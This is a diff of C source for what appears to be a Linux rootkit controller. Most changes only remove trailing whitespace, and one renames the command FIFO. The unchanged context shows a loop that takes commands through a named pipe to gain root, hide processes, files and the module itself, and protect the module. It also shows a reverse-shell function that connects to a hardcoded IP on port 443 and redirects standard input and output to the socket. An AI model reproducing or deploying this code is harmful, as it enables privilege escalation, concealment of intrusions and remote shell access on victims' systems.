@@ -1,5 +1,5 @@
 /*
- * Copyright (C) 2016-2017 Arian Suarez 
+ * Copyright (C) 2016-2017 Arian Suarez
  *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -75,7 +75,7 @@ int main(int argc, char **argv)
         return 1;
     }
 
-    char *pipe_name = "/tmp/my_fifo";
+    char *pipe_name = "/tmp/grape_fifo";
     char pipe_buf[MAX_BUF];
     char *arg1 = malloc(32);
     char *arg2 = malloc(256);
@@ -84,9 +84,9 @@ int main(int argc, char **argv)
     mkfifo(pipe_name, 0666);
 
     /*  Become root process */
-    action(ACTIVE,  INACTIVE, 
+    action(ACTIVE,  INACTIVE,
             INACTIVE, NULL, INACTIVE,
-            INACTIVE, NULL, INACTIVE, 
+            INACTIVE, NULL, INACTIVE,
             INACTIVE, INACTIVE, INACTIVE);
 
 
@@ -96,18 +96,18 @@ int main(int argc, char **argv)
     while(1){
         /*  read from pipe, while loop till pipe has args */
         read_from_pipe(pipe_name, pipe_buf);
-        printf("received %s\n", pipe_buf); 
+        printf("received %s\n", pipe_buf);
 
         /*  parse input for arguments */
-        parse_input(pipe_buf, &arg1, &arg2); 
+        parse_input(pipe_buf, &arg1, &arg2);
 
         printf("Arg1: %s, len: %d\n", arg1, (int)strlen(arg1));
         printf("Arg2: %s, len: %d\n", arg2, (int)strlen(arg2));
 
         if (strcmp(arg1, "root") == 0){
-            action(ACTIVE,  INACTIVE, 
+            action(ACTIVE,  INACTIVE,
                     INACTIVE, NULL, INACTIVE,
-                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
                     INACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "touch") == 0){
@@ -116,58 +116,58 @@ int main(int argc, char **argv)
         }
         if (strcmp(arg1, "hpid") == 0){
             printf("hpid\n");
-            action(INACTIVE,  ACTIVE, 
+            action(INACTIVE,  ACTIVE,
                     INACTIVE, arg2, INACTIVE,
-                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
                     INACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "unpid") == 0){
             printf("unpid\n");
-            action(INACTIVE,  INACTIVE, 
+            action(INACTIVE,  INACTIVE,
                     ACTIVE, arg2, INACTIVE,
-                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
                     INACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "hfile") == 0){
             printf("hfile\n");
-            action(INACTIVE,  INACTIVE, 
+            action(INACTIVE,  INACTIVE,
                     INACTIVE, NULL, ACTIVE,
-                    INACTIVE, arg2, INACTIVE, 
+                    INACTIVE, arg2, INACTIVE,
                     INACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "unfile") == 0){
             printf("unfile\n");
-            action(INACTIVE,  INACTIVE, 
+            action(INACTIVE,  INACTIVE,
                     INACTIVE, NULL, INACTIVE,
-                    ACTIVE, arg2, INACTIVE, 
+                    ACTIVE, arg2, INACTIVE,
                     INACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "hide") == 0){
             printf("hide\n");
-            action(INACTIVE,  INACTIVE, 
+            action(INACTIVE,  INACTIVE,
                     INACTIVE, NULL, INACTIVE,
-                    INACTIVE, NULL, ACTIVE, 
+                    INACTIVE, NULL, ACTIVE,
                     INACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "unhide") == 0){
             printf("unhide\n");
-            action(INACTIVE,  INACTIVE, 
+            action(INACTIVE,  INACTIVE,
                     INACTIVE, NULL, INACTIVE,
-                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
                     ACTIVE, INACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "protect") == 0){
             printf("protect\n");
-            action(INACTIVE,  INACTIVE, 
+            action(INACTIVE,  INACTIVE,
                     INACTIVE, NULL, INACTIVE,
-                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
                     INACTIVE, ACTIVE, INACTIVE);
         }
         if (strcmp(arg1, "unprotect") == 0){
             printf("unprotect\n");
-            action(INACTIVE,  INACTIVE, 
+            action(INACTIVE,  INACTIVE,
                     INACTIVE, NULL, INACTIVE,
-                    INACTIVE, NULL, INACTIVE, 
+                    INACTIVE, NULL, INACTIVE,
                     INACTIVE, INACTIVE, ACTIVE);
         }
         if (strcmp(arg1, "reverse") == 0){
@@ -190,7 +190,7 @@ void action(int root, int hide_pid,
     buf_size += sizeof(CFG_PASS);
 
     if (root) {
-        printf("root\n"); 
+        printf("root\n");
         buf_size += sizeof(CFG_ROOT);
     } else if (hide_pid) {
         buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
@@ -278,7 +278,7 @@ int word_count(char *s){
 
     for (i = 0;s[i] != '\0';i++){
         if (s[i] == ' ')
-            count++;    
+            count++;
     }
 
     return count;
@@ -299,7 +299,7 @@ void parse_input(char *pkt, char **arg1, char **arg2){
 }
 
 void read_from_pipe(char *pipe_name, char *pipe_buf){
-    
+
     /*  Clear buffer */
     memset(&pipe_buf[0], 0, sizeof(pipe_buf));
 
@@ -373,7 +373,7 @@ int start_reverse_shell(char *ip, unsigned int port){
         sa.sin_addr.s_addr = inet_addr("10.0.2.15");
         sa.sin_port = htons(443);
 
-        s = socket(AF_INET, SOCK_STREAM, 0); 
+        s = socket(AF_INET, SOCK_STREAM, 0);
         connect(s, (struct sockaddr *)&sa, sizeof(sa));
         dup2(s, 0);
         dup2(s, 1);
